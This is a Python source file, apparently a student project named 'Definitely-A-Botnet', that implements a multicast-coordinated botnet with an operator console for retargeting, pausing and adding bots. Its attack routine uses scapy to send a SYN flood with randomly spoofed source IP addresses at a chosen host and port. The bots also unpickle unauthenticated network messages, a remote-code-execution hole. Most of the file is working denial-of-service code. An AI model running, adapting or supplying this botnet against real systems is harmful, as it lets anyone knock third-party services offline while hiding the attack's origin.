#Definitely not a botnet
import base64
from cgi import print_form
from random import randint
import socket
import struct
import selectors
import time
import string
import pickle
import copy
import datetime
import sys
import subprocess

import fcntl
import os
from scapy.all import *

BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits


# set sys.stdin non-blocking
orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)

def randInt():
	x = randint(1000,9000)
	return x	
    
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def printMenu():
                menu = """
                    Available instructions:
                    "stop" - stop the bots
                    "status" - view botnet status
                    "target" - change target
                    "pause" - pause attack
                    "resume" - resume attack 
                    "add" - add a bot
                    "add x" - add x bots (pausing is recommended ;) )
                """
                print(menu)
                sys.stdout.write("> ")                                              # For that old-school IRC feel
                sys.stdout.flush()
class zerg:
    def __init__(self, name: str = ""):

        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()

        self.isControl =False if name !="admin" else True
        # Commands
        self.kill = False
        self.pause = False

        self.TARGET = "192.168.1.102"
        self.TARGETPORT=5000

        # --Things for communication with victim server (HTTP,TCP)---
        self.HOST = self.TARGET # "host.docker.internal"
        self.PORT = self.TARGETPORT

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.mCastSock.settimeout(2)
        self.MCAST_TTL = struct.pack('b', 2)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT =10000
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt( socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        #self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        self.mCastSock.bind(('', 10000))

        # Listen for socket activity
        if name != "admin":
            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)
        else:
            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.countBots)
        self.sel.register(sys.stdin, selectors.EVENT_READ, self.controlInput)   # Listen for input activity

        self.verified = []
        self.peers = {}

        self.latest_pws = list()
        self.lastTry=0
        self.id = randint(0,1000000)
#        self.connect()

        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        print("I AM:",self.address)

    def countBots(self):
        try:
                data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            print("aaaaa")
            return
        else:
            recvMSG = pickle.loads(data) 

            if  recvMSG['command'] =="imhere":
                if recvMSG['id'] in self.peers:
                    self.peers[recvMSG['id']]=[time.time()] # last seen at: now
                else:
                    self.peers[recvMSG['id']]=[time.time()]  # New peer
            
        

    def sayImHere(self):                           
        '''Send a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',
            'id':self.id

        }
        encodedMSG = pickle.dumps(msg)
        
        # Send the ImHere message to peers (via Multicast)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayStop(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'stop',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayTarget(self,target :str, port:str):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'target',
            'target':target,
            'port':port
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayPause(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'pause'
        }
        encodedMSG = pickle.dumps(msg)

        #self.mCastSock.setsockopt(
        #    socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
    
    def sayResume(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'resume',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayAdd(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'add',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))


    def recvMCAST(self):
        '''Receive messages from our peers (and process them)'''
        try:
            data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            print("aaaaa")
            return
        else:
            recvMSG = pickle.loads(data) 
            if server in self.peers:
                self.peers[server]=[time.time(),self.peers[server][1]] # last seen at: now
            else:
                self.peers[server]=[time.time(),[0,0]]  # New peer
            
            cmd = recvMSG['command']
            if cmd=='imhere':
                # Sort out stored ranges and verified pwds
                pass

               
            elif cmd=='stop':
                try:
                  print("Shutting down...")
                except BlockingIOError:
                        pass
                #print("# PASSWORDS TESTED:", arraySum(self.verified))
                exit(0) # Shutting down...
            elif cmd=='target':
                TARGET = recvMSG['target']
                
                TARGETPORT = recvMSG['port'] if recvMSG['port'] != "" else self.TARGETPORT
                self.HOST = TARGET # "host.docker.internal"
                self.PORT = TARGETPORT
                self.TARGET=TARGET
                self.TARGETPORT = TARGETPORT
                try:
                    print(f"Changing target to {TARGET}:{TARGETPORT} ")
                except BlockingIOError:
                        pass



            elif cmd == "pause":
                print("Paused.")
                self.pause = True
            elif cmd == "resume":
                print("Resumed.")
                self.pause = False
            elif cmd == "add":
                #os.system('/home/inryatt/Uni/3ano/apsei/CD/slave.py')
                subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,
    stderr=subprocess.STDOUT)
            
            return



    def attack(self):
        """Creates the AuthHeader with the created pw"""  
   
        s_port = randInt()
        s_eq = randInt()

        w_indow = randint(60000,65534) 
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = self.TARGET 
        TCP_Packet = TCP()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = self.TARGETPORT
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        
        send(IP_Packet/TCP_Packet, verbose=0)


    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)


    def controlLoop(self):

        try:
            print("Welcome to Definitely-A-Botnet")
            printMenu()
            while(True):
                    toDo = self.sel.select(0)
                    for event, data in toDo:
                        callback = event.data
                        msg = callback()
                    expired = []
                    for peer in self.peers.keys():
                        if time.time() - self.peers[peer][0] > 50:
                            expired+=[peer]
                    for peer in expired:
                        self.peers.pop(peer)
                                
        except KeyboardInterrupt:
            print("Shutting Down... Want to stop bots? y/n")
            inp =input("> ")
            if inp=="y":
                self.sayStop()
            else:
                print("Goodbye")
                exit(0)

    def controlInput(self):
                
                inp = sys.stdin.read().rstrip("\n")   #Get user's input

                if(inp =="stop"):
                    self.sayStop()
                elif(inp=="status"):
                    print("Status Screen Goes here") #TODO status screen
                    

                    print(self.peers.keys())
                    print(f"bots: {len(self.peers.keys())}")
                elif("target"in inp):
                    inp=inp.split(" ")
                    siz = len(inp)
                    if siz <2:
                        print("Missing target!")
                        
                    elif(siz==2):
                        self.sayTarget(inp[1] ,"")
                    elif(siz==3):
                        self.sayTarget(inp[1] ,inp[2])
                    else:
                        print("idk man")
                elif(inp=="pause"):
                    self.sayPause()
                elif(inp=="resume"):
                    self.sayResume()
                elif("add" in inp):
                    inp=inp.split(" ")
                    siz = len(inp)
                    if siz <2 or inp[1]=="":
                        times=1
                    else:
                        times=int(inp[1])
                    for i in range(0,times):
                        #self.sayAdd()
                        subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,    stderr=subprocess.STDOUT)


                    print(f"Adding {times} bots.")
                else:
                    print("/!\ Invalid Command!")
                printMenu()
   
    def loop(self):
        '''Main Loop'''
        count = 0
        if self.isControl:
            self.controlLoop()
        else:
            print(f"Target:{self.TARGET}:{self.TARGETPORT}")

            while not self.kill:                                  
                #print("all your base are belong to us")         # nice ref :D

                if not self.pause:
                    
                    for i in range(10):
                            self.attack()
                    count+=1

                    if count%10==0:
                        count=0
                        self.sayImHere()

                expired = []
                for peer in self.peers.keys():
                    if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
                        expired+=[peer]
                for peer in expired:
                    self.peers.pop(peer)

                toDo = self.sel.select(0)
                for event, data in toDo:
                    callback = event.data
                    msg = callback()

if __name__=="__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "Brood1"
    slave=zerg(name)
    slave.loop()